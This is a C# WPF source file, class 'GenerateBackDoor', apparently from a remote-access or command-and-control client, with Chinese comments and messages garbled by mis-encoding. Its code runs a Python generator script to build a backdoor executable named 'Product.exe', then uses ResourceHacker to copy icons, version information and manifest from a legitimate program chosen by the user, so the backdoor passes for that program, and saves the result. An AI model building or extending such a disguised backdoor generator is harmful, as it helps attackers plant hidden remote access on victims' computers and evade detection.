using System;
using System.IO;
using System.Windows;
using Microsoft.Win32;

// ���ɺ���
namespace Client
{
    public partial class GenerateBackDoor
    {
        bool selectProfile = false;

        public GenerateBackDoor()
        {
            InitializeComponent();
        }

        // ѡ��Դ��
        private void SelectProfile_Click(object sender, RoutedEventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Title = "ѡ�� Profile";
            openFileDialog.Filter = "(*.txt) | *.txt";
            if (Environment.CurrentDirectory.Contains("Client\\bin"))
            {
                openFileDialog.InitialDirectory = Path.GetFullPath(Environment.CurrentDirectory + "\\..\\..\\..\\Shell\\Generator");
            }
            else
            {
                openFileDialog.InitialDirectory = Path.GetFullPath(Environment.CurrentDirectory + "\\..\\Shell\\Generator");
            }
            if ((bool)openFileDialog.ShowDialog())
            {
                selectProfile = true;
                selectProfile_Button.Content = openFileDialog.FileName;
            }
        }

        // ����
        private void Generate_Click(object sender, RoutedEventArgs e)
        {
            string bit = Function.GetRadioResult(bit_WrapPanel);
            if (bit == null)
            {
                MessageBox.Show("δѡ��λ��", "����", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }
            if (bit == "x86")
            {
                MessageBox.Show("�ݲ�֧�� x86", "����", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            if (!selectProfile)
            {
                MessageBox.Show("δѡ�� Profile", "����", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            // �����������ű�
            string GeneratePath = Environment.CurrentDirectory + "\\tmp\\Product.exe";
            try
            {
                Function.InvokeTool("python", "\"" + Path.GetDirectoryName(selectProfile_Button.Content.ToString()) + "\\Generator.py\" \"" + selectProfile_Button.Content + "\" \"" + GeneratePath + "\"");
            }
            catch
            {
                MessageBox.Show("�������ű�����ʧ�� / Python δ�������������", "����", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            if (!File.Exists(GeneratePath))
            {
                MessageBox.Show("����ʧ�� / Visual Studio �� msbuild.exe δ�������������\nC:\\Program Files\\Microsoft Visual Studio\\xxxx\\Professional\\MSBuild\\Current\\Bin", "����", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            try
            {
                OpenFileDialog openFileDialog = new OpenFileDialog();
                openFileDialog.Title = "�����Դ (ǿ�ҽ���)��ѡ�� PE �ļ�������Դ��ȡ";
                openFileDialog.Filter = "(*.exe;*.dll) | *.exe;*.dll";
                if (openFileDialog.ShowDialog() == true)
                {
                    string resFilePath = openFileDialog.FileName;
                    Function.InvokeTool("tools\\ResourceHacker", "-open \"tmp\\Product.exe\" -save \"tmp\\Product.exe\" -res \"" + resFilePath + "\" -action addoverwrite -mask *");
                    Function.InvokeTool("tools\\ResourceHacker", "-open \"" + resFilePath + "\" -save \"tmp\\VERSIONINFO.res\" -action extract -mask VERSIONINFO");
                    Function.InvokeTool("tools\\ResourceHacker", "-open \"" + resFilePath + "\" -save \"tmp\\MANIFEST.res\" -action extract -mask MANIFEST");
                    Function.InvokeTool("tools\\ResourceHacker", "-open \"tmp\\Product.exe\" -save \"tmp\\Product.exe\" -res \"tmp\\VERSIONINFO.res\" -action addoverwrite -mask *");
                    Function.InvokeTool("tools\\ResourceHacker", "-open \"tmp\\Product.exe\" -save \"tmp\\Product.exe\" -res \"tmp\\MANIFEST.res\" -action addoverwrite -mask *");
                }
            }
            catch
            {
                MessageBox.Show("��Դ���ʧ��", "����", MessageBoxButton.OK, MessageBoxImage.Error);
            }

            try
            {
                SaveFileDialog saveFileDialog = new SaveFileDialog();
                saveFileDialog.Title = "ѡ������·��";
                saveFileDialog.Filter = "(*.*) | *.*";
                saveFileDialog.FileName = "Product.exe";
                if (saveFileDialog.ShowDialog() == true)
                {
                    File.Move(GeneratePath, saveFileDialog.FileName);
                    MessageBox.Show("������� ! ! !\n�����ӵ���Դ���³����޷��������������Դ��", "֪ͨ", MessageBoxButton.OK, MessageBoxImage.Information);
                }
            }
            catch
            {
                MessageBox.Show("����ʧ��", "����", MessageBoxButton.OK, MessageBoxImage.Error);
            }

            File.Delete(GeneratePath);
        }
    }
}